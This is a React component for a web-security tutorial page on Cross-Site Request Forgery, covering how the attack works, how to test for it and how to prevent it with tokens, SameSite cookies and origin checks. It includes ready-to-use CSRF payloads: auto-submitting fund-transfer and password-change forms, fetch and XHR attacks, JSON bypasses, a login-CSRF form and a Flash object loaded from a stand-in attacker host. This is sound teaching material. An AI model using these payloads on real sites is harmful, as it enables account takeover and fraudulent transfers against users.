
import React from 'react';
import { ShieldAlert } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { InfoIcon } from 'lucide-react';

const CSRF: React.FC = () => {
  return (
    <section id="csrf" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Cross-Site Request Forgery (CSRF)</h3>
      
      <div className="space-y-6">
        {/* Introduction */}
        <div>
          <p className="mb-4">
            CSRF attacks trick authenticated users into executing unwanted actions on a web application where they're currently authenticated.
            This exploits the trust a website has in a user's browser, making the victim perform state-changing requests like fund transfers,
            password changes, or account modifications without their knowledge or consent. CSRF is particularly dangerous because it leverages
            the victim's existing authenticated session to perform malicious actions.
          </p>
          
          <Alert className="mb-4 text-amber-900 dark:text-amber-200 bg-slate-50">
            <InfoIcon className="h-4 w-4" />
            <AlertTitle>Attacker's Goal</AlertTitle>
            <AlertDescription>
              Force authenticated users to perform unintended actions such as changing passwords, transferring funds, 
              modifying account settings, or performing administrative functions without their knowledge.
            </AlertDescription>
          </Alert>
        </div>

        {/* Attack Mechanics */}
        <div>
          <h4 className="text-xl font-semibold mb-4">How CSRF Attacks Work</h4>
          <div className="p-4 bg-cybr-muted/50 rounded-md mb-4">
            <h5 className="font-semibold mb-2">Attack Flow:</h5>
            <ol className="list-decimal pl-6 space-y-2">
              <li><strong>User Authentication:</strong> The victim logs into a vulnerable website (e.g., banking site) and receives a session cookie</li>
              <li><strong>Session Persistence:</strong> Without logging out, the victim visits a malicious website controlled by the attacker</li>
              <li><strong>Malicious Request:</strong> The malicious site contains code that automatically submits a form or sends a request to the vulnerable site</li>
              <li><strong>Automatic Cookie Inclusion:</strong> The victim's browser automatically includes the session cookies when making the request</li>
              <li><strong>Server Processing:</strong> The vulnerable site processes the request as if the victim intentionally submitted it</li>
              <li><strong>Action Execution:</strong> The malicious action is completed using the victim's authenticated session</li>
            </ol>
          </div>
        </div>

        {/* Vulnerable Components */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Commonly Vulnerable Components</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <SecurityCard
              title="State-Changing Forms"
              description="Any form that performs actions like password changes, profile updates, money transfers, or administrative functions without CSRF protection."
              severity="high"
            />
            <SecurityCard
              title="RESTful APIs"
              description="API endpoints that rely solely on cookies for authentication and perform state-changing operations via GET/POST requests."
              severity="high"
            />
            <SecurityCard
              title="Single Page Applications"
              description="SPAs that make AJAX requests without including CSRF tokens or relying only on cookie-based authentication."
              severity="medium"
            />
            <SecurityCard
              title="Administrative Interfaces"
              description="Admin panels and management interfaces that perform privileged operations without proper CSRF protection."
              severity="high"
            />
          </div>
        </div>

        {/* Types of CSRF Attacks */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Types of CSRF Attacks</h4>
          <Tabs defaultValue="classic">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="classic">Classic CSRF</TabsTrigger>
              <TabsTrigger value="ajax">AJAX-based CSRF</TabsTrigger>
              <TabsTrigger value="json">JSON CSRF</TabsTrigger>
              <TabsTrigger value="login">Login CSRF</TabsTrigger>
            </TabsList>
            
            <TabsContent value="classic" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">Classic Form-Based CSRF</h5>
                  <p className="text-sm mb-3">
                    Traditional CSRF attacks using HTML forms that automatically submit when the victim visits the attacker's page.
                    These attacks work because browsers automatically include cookies with form submissions to the target domain.
                  </p>
                  
                  <h6 className="font-medium mb-2">Attack Scenario:</h6>
                  <CodeExample
                    language="html"
                    title="Malicious Website Code"
                    code={`<!-- Attacker's website contains this hidden form -->
<form action="https://bank.example.com/transfer" method="POST" id="exploit-form">
  <input type="hidden" name="recipient" value="attacker-account">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="memo" value="Payment">
</form>

<script>
  // Automatically submit the form when page loads
  document.getElementById("exploit-form").submit();
</script>

<!-- Alternative methods -->
<!-- Image-based GET request -->
<img src="https://bank.example.com/transfer?to=attacker&amount=1000" style="display:none">

<!-- Link that triggers on hover -->
<a href="https://bank.example.com/delete-account" onmouseover="this.click()">Win a Prize!</a>`}
                  />
                  
                  <h6 className="font-medium mb-2 mt-3">Testing Methodology:</h6>
                  <ol className="list-decimal pl-6 space-y-1 text-sm">
                    <li>Identify all state-changing forms and their required parameters</li>
                    <li>Create a test HTML page with a form targeting the vulnerable endpoint</li>
                    <li>Ensure you're logged into the target application in the same browser</li>
                    <li>Visit your test page and check if the action was performed</li>
                    <li>Monitor network traffic to confirm the request was sent with cookies</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="ajax" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">AJAX-Based CSRF</h5>
                  <p className="text-sm mb-3">
                    Modern CSRF attacks using JavaScript to make XMLHttpRequest or fetch API calls. 
                    These are limited by the Same-Origin Policy but can still work for simple requests 
                    or when CORS is misconfigured.
                  </p>
                  
                  <h6 className="font-medium mb-2">Attack Examples:</h6>
                  <CodeExample
                    language="javascript"
                    title="AJAX CSRF Attack"
                    code={`// Simple CSRF using fetch API
fetch('https://vulnerable-site.com/api/change-password', {
  method: 'POST',
  credentials: 'include', // This includes cookies
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
  },
  body: 'new_password=hacked123&confirm_password=hacked123'
});

// CSRF with XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://vulnerable-site.com/api/transfer');
xhr.withCredentials = true; // Include cookies
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('recipient=attacker&amount=5000');

// CSRF via dynamically created form
function performCSRF() {
  var form = document.createElement('form');
  form.method = 'POST';
  form.action = 'https://vulnerable-site.com/admin/delete-user';
  
  var input = document.createElement('input');
  input.type = 'hidden';
  input.name = 'user_id';
  input.value = '123';
  
  form.appendChild(input);
  document.body.appendChild(form);
  form.submit();
}`}
                  />
                  
                  <h6 className="font-medium mb-2 mt-3">Limitations and Bypasses:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Simple requests (GET, POST with specific content types) bypass CORS preflight</li>
                    <li>Custom headers trigger preflight, but simple headers don't</li>
                    <li>Misconfigured CORS policies may allow cross-origin requests</li>
                    <li>WebSocket connections may not be subject to same restrictions</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="json" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">JSON CSRF Attacks</h5>
                  <p className="text-sm mb-3">
                    Attacks targeting APIs that accept JSON payloads. While these usually trigger CORS preflight checks,
                    certain techniques can bypass these protections or exploit misconfigured CORS policies.
                  </p>
                  
                  <h6 className="font-medium mb-2">Bypass Techniques:</h6>
                  <CodeExample
                    language="javascript"
                    title="JSON CSRF Bypass Methods"
                    code={`// Method 1: Using form with text/plain content type (simple request)
var form = document.createElement('form');
form.method = 'POST';
form.action = 'https://api.example.com/user/update';
form.enctype = 'text/plain';

var input = document.createElement('input');
input.name = '{"email":"attacker@evil.com","role":"admin"}';
input.value = '';
form.appendChild(input);

document.body.appendChild(form);
form.submit();

// Method 2: Exploiting Flash or other plugins
// Using Flash to send arbitrary content-type requests
var flashObject = document.createElement('object');
flashObject.data = 'https://attacker.com/csrf.swf';
// Flash can make requests without CORS restrictions

// Method 3: Exploiting JSONP endpoints
function jsonpCallback(data) {
  // This gets called with the response data
  console.log('Stolen data:', data);
}

var script = document.createElement('script');
script.src = 'https://vulnerable-site.com/api/user-data?callback=jsonpCallback';
document.head.appendChild(script);

// Method 4: Content-Type manipulation
// Some servers accept JSON with wrong content type
fetch('https://vulnerable-api.com/endpoint', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'json={"malicious":"payload"}'
});`}
                  />
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="login" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold text-lg mb-2">Login CSRF</h5>
                  <p className="text-sm mb-3">
                    A variant where the attacker forces the victim to log into the attacker's account, 
                    potentially allowing the attacker to access data the victim enters while logged into the wrong account.
                  </p>
                  
                  <h6 className="font-medium mb-2">Attack Flow:</h6>
                  <CodeExample
                    language="html"
                    title="Login CSRF Attack"
                    code={`<!-- Force victim to log into attacker's account -->
<form action="https://target-site.com/login" method="POST" id="login-csrf">
  <input type="hidden" name="username" value="attacker-username">
  <input type="hidden" name="password" value="attacker-password">
</form>

<script>
  // Automatically submit login form
  document.getElementById("login-csrf").submit();
</script>

<!-- After this attack:
1. Victim is logged into attacker's account
2. Victim might enter sensitive information (credit card, etc.)
3. Attacker can later log in and see this information
4. Victim might not notice they're in the wrong account -->`}
                  />
                  
                  <h6 className="font-medium mb-2 mt-3">Impact Scenarios:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Victim enters payment information into attacker's account</li>
                    <li>Victim uploads files to attacker's cloud storage</li>
                    <li>Victim's search history is saved to attacker's account</li>
                    <li>Victim makes purchases that benefit the attacker</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Step-by-Step Testing Guide */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Step-by-Step CSRF Testing Guide</h4>
          <Tabs defaultValue="identification">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="identification">Identification</TabsTrigger>
              <TabsTrigger value="analysis">Analysis</TabsTrigger>
              <TabsTrigger value="exploitation">Exploitation</TabsTrigger>
              <TabsTrigger value="verification">Verification</TabsTrigger>
            </TabsList>
            
            <TabsContent value="identification" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 1: Identify Potential CSRF Targets</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">What to Look For:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>State-changing operations (POST, PUT, DELETE requests)</li>
                    <li>Forms that modify user data or application state</li>
                    <li>Administrative functions and privileged operations</li>
                    <li>API endpoints that perform actions based on user input</li>
                    <li>Functions like password changes, fund transfers, profile updates</li>
                  </ul>
                  
                  <h6 className="font-medium mb-2 mt-3">Tools and Techniques:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Use Burp Suite's site map to identify all forms and requests</li>
                    <li>Browser developer tools to monitor network requests</li>
                    <li>Manual browsing while logged in to find state-changing operations</li>
                    <li>Check for CSRF tokens in forms and AJAX requests</li>
                    <li>Look for SameSite cookie attributes</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="analysis" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 2: Analyze Protection Mechanisms</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Check for CSRF Tokens:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Look for hidden form fields with names like 'csrf_token', '_token', 'authenticity_token'</li>
                    <li>Check HTTP headers for tokens (X-CSRF-Token, X-CSRFToken)</li>
                    <li>Analyze if tokens are properly validated server-side</li>
                    <li>Test if tokens are unique per session and request</li>
                  </ul>
                  
                  <h6 className="font-medium mb-2 mt-3">Cookie Analysis:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Check if session cookies have SameSite attribute</li>
                    <li>Verify if HttpOnly flag is set appropriately</li>
                    <li>Test cookie behavior in cross-site contexts</li>
                    <li>Analyze cookie scope and domain settings</li>
                  </ul>
                  
                  <h6 className="font-medium mb-2 mt-3">Referer/Origin Validation:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Test if server validates Referer header</li>
                    <li>Check if Origin header is validated</li>
                    <li>Try requests with missing, malformed, or spoofed headers</li>
                    <li>Test subdomain-based bypasses</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="exploitation" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 3: Craft and Execute CSRF Attacks</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Basic Form Attack:</h6>
                  <CodeExample
                    language="html"
                    title="CSRF PoC Template"
                    code={`<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    
    <!-- Auto-submitting form -->
    <form action="https://vulnerable-site.com/change-password" method="POST" id="csrf-form">
        <input type="hidden" name="new_password" value="pwned123">
        <input type="hidden" name="confirm_password" value="pwned123">
    </form>
    
    <script>
        // Submit form automatically
        document.getElementById('csrf-form').submit();
        
        // Alternative: submit after delay
        // setTimeout(function() {
        //     document.getElementById('csrf-form').submit();
        // }, 2000);
    </script>
</body>
</html>`}
                  />
                  
                  <h6 className="font-medium mb-2 mt-3">Advanced Techniques:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Try removing CSRF tokens entirely</li>
                    <li>Use empty or invalid tokens</li>
                    <li>Reuse tokens from other sessions</li>
                    <li>Test token validation timing attacks</li>
                    <li>Try CSRF attacks via WebSocket connections</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="verification" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 4: Verify and Document Impact</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Verification Steps:</h6>
                  <ol className="list-decimal pl-6 space-y-1 text-sm">
                    <li>Confirm the malicious action was actually performed</li>
                    <li>Check application logs for evidence of the attack</li>
                    <li>Verify that no user interaction was required</li>
                    <li>Test the attack across different browsers</li>
                    <li>Document the complete attack flow and impact</li>
                  </ol>
                  
                  <h6 className="font-medium mb-2 mt-3">Impact Assessment:</h6>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Unauthorized fund transfers or payments</li>
                    <li>Account takeover through password/email changes</li>
                    <li>Privilege escalation in administrative interfaces</li>
                    <li>Data modification or deletion</li>
                    <li>Unwanted actions performed on behalf of users</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Prevention Techniques */}
        <div>
          <h4 className="text-xl font-semibold mb-4">CSRF Prevention Techniques</h4>
          <Tabs defaultValue="tokens">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="tokens">CSRF Tokens</TabsTrigger>
              <TabsTrigger value="samesite">SameSite Cookies</TabsTrigger>
              <TabsTrigger value="headers">Custom Headers</TabsTrigger>
              <TabsTrigger value="validation">Origin Validation</TabsTrigger>
            </TabsList>
            
            <TabsContent value="tokens" className="mt-4">
              <CodeExample
                language="javascript"
                title="CSRF Token Implementation"
                code={`// Express.js with CSRF protection
const express = require('express');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());

// Setup CSRF protection
const csrfProtection = csrf({ cookie: true });

// Apply CSRF protection to all routes
app.use(csrfProtection);

// Provide CSRF token to templates
app.get('/transfer-form', (req, res) => {
  res.render('transfer', { 
    csrfToken: req.csrfToken(),
    user: req.user 
  });
});

// Protected endpoint
app.post('/transfer', (req, res) => {
  // CSRF middleware validates token automatically
  const { recipient, amount } = req.body;
  
  // Perform transfer logic
  if (isValidTransfer(recipient, amount, req.user)) {
    processTransfer(req.user.id, recipient, amount);
    res.json({ success: true, message: 'Transfer completed' });
  } else {
    res.status(400).json({ error: 'Invalid transfer parameters' });
  }
});

// Manual token validation (if needed)
function validateCsrfToken(req, res, next) {
  const token = req.headers['x-csrf-token'] || req.body._csrf;
  const storedToken = req.session.csrfToken;
  
  if (!token || !storedToken || token !== storedToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  
  next();
}`}
              />
            </TabsContent>
            
            <TabsContent value="samesite" className="mt-4">
              <CodeExample
                language="javascript"
                title="SameSite Cookie Configuration"
                code={`// Configure session cookies with SameSite attribute
app.use(session({
  secret: process.env.SESSION_SECRET,
  name: 'sessionId',
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production', // HTTPS only in production
    sameSite: 'strict', // or 'lax' for better compatibility
    maxAge: 24 * 60 * 60 * 1000 // 24 hours
  },
  resave: false,
  saveUninitialized: false
}));

// Set SameSite attribute for custom cookies
res.cookie('auth-token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000 // 1 hour
});

// Different SameSite values:
// 'strict' - Cookie sent only for same-site requests
// 'lax' - Cookie sent for same-site and top-level navigation
// 'none' - Cookie sent for all cross-site requests (requires Secure flag)`}
              />
            </TabsContent>
            
            <TabsContent value="headers" className="mt-4">
              <CodeExample
                language="javascript"
                title="Custom Headers for CSRF Protection"
                code={`// Client-side: Add custom header to AJAX requests
function makeSecureRequest(url, data) {
  return fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest', // Custom header
      'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content
    },
    credentials: 'include',
    body: JSON.stringify(data)
  });
}

// Server-side: Validate custom headers
app.use('/api/', (req, res, next) => {
  // Check for required custom header
  if (!req.headers['x-requested-with']) {
    return res.status(400).json({ error: 'Missing required header' });
  }
  
  // Additional validation for AJAX requests
  if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
    return res.status(400).json({ error: 'Invalid request type' });
  }
  
  next();
});

// Double submit cookie pattern
app.post('/api/sensitive-action', (req, res) => {
  const csrfCookie = req.cookies['csrf-token'];
  const csrfHeader = req.headers['x-csrf-token'];
  
  if (!csrfCookie || !csrfHeader || csrfCookie !== csrfHeader) {
    return res.status(403).json({ error: 'CSRF token mismatch' });
  }
  
  // Process request
  handleSensitiveAction(req.body);
  res.json({ success: true });
});`}
              />
            </TabsContent>
            
            <TabsContent value="validation" className="mt-4">
              <CodeExample
                language="javascript"
                title="Origin and Referer Validation"
                code={`// Validate Origin header
function validateOrigin(req, res, next) {
  const origin = req.headers.origin;
  const allowedOrigins = [
    'https://example.com',
    'https://app.example.com',
    'https://admin.example.com'
  ];
  
  // Check if origin is in allowed list
  if (origin && !allowedOrigins.includes(origin)) {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  
  next();
}

// Validate Referer header (backup method)
function validateReferer(req, res, next) {
  const referer = req.headers.referer;
  const allowedDomains = ['example.com'];
  
  if (referer) {
    const refererDomain = new URL(referer).hostname;
    const isAllowed = allowedDomains.some(domain => 
      refererDomain === domain || refererDomain.endsWith('.' + domain)
    );
    
    if (!isAllowed) {
      return res.status(403).json({ error: 'Invalid referer' });
    }
  }
  
  next();
}

// Combined validation middleware
app.use('/api/sensitive/', [
  validateOrigin,
  validateReferer,
  csrfProtection
]);

// Content-Type validation for JSON endpoints
app.use('/api/json/', (req, res, next) => {
  const contentType = req.headers['content-type'];
  
  if (!contentType || !contentType.includes('application/json')) {
    return res.status(400).json({ error: 'Invalid content type' });
  }
  
  next();
});`}
              />
            </TabsContent>
          </Tabs>
        </div>

        {/* Testing Tools */}
        <div>
          <h4 className="text-xl font-semibold mb-4">CSRF Testing Tools</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Automated Tools</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Burp Suite:</strong> Built-in CSRF detection and PoC generation</li>
                <li><strong>OWASP ZAP:</strong> Active and passive CSRF vulnerability scanning</li>
                <li><strong>CSRFtester:</strong> Specialized tool for CSRF testing</li>
                <li><strong>Nuclei:</strong> CSRF templates for automated scanning</li>
                <li><strong>W3af:</strong> Web application scanner with CSRF detection</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Manual Testing Tools</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Browser DevTools:</strong> Monitor requests and analyze forms</li>
                <li><strong>Postman/Insomnia:</strong> Craft and send custom requests</li>
                <li><strong>curl:</strong> Command-line testing of endpoints</li>
                <li><strong>CSRF PoC Generator:</strong> Automated HTML form generation</li>
                <li><strong>Browser Extensions:</strong> HackBar, CSRF-Request-Builder</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Environment-Specific Considerations */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Environment-Specific Considerations</h4>
          <div className="p-4 bg-cybr-muted/50 rounded-md">
            <h5 className="font-semibold mb-2">Framework-Specific Protections</h5>
            <ul className="list-disc pl-6 space-y-2 text-sm">
              <li><strong>Django:</strong> Built-in CSRF middleware with csrf_token template tag</li>
              <li><strong>Ruby on Rails:</strong> protect_from_forgery method and authenticity tokens</li>
              <li><strong>ASP.NET:</strong> Anti-forgery tokens with AntiForgeryToken</li>
              <li><strong>Spring Security:</strong> CSRF protection enabled by default in newer versions</li>
              <li><strong>Laravel:</strong> @csrf Blade directive and automatic token validation</li>
              <li><strong>Angular:</strong> Built-in CSRF protection with HttpClientXsrfModule</li>
              <li><strong>React:</strong> Manual implementation required, often with libraries like axios</li>
            </ul>
          </div>
        </div>
      </div>
    </section>
  );
};

export default CSRF;
